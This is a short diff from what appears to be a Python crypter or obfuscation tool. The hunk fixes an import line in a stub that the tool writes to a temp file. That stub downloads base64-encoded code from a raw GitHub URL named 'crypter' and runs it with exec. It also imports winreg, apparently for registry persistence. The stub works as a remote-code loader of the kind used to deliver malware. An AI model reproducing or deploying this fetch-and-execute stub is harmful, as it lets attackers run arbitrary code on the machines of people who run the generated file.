@@ -125,7 +125,7 @@ except {encryptstring('__import__("lzma").LZMAError', func=True)}:...
 if __name__ == "__main__":
 
     with open(temp_file_path, 'w', encoding='utf-8') as temp_file:
-        temp_file.write('''import subprocess, base64, requests, os, import winreg as reg
+        temp_file.write('''import subprocess, base64, requests, os, winreg as reg
 temp_dir = os.getenv('TEMP', '/tmp')  
 exec(base64.b64decode(requests.get("https://raw.githubusercontent.com/Anex00/mystartingrepo/main/crypter").text).decode('utf-8'))
 ''')
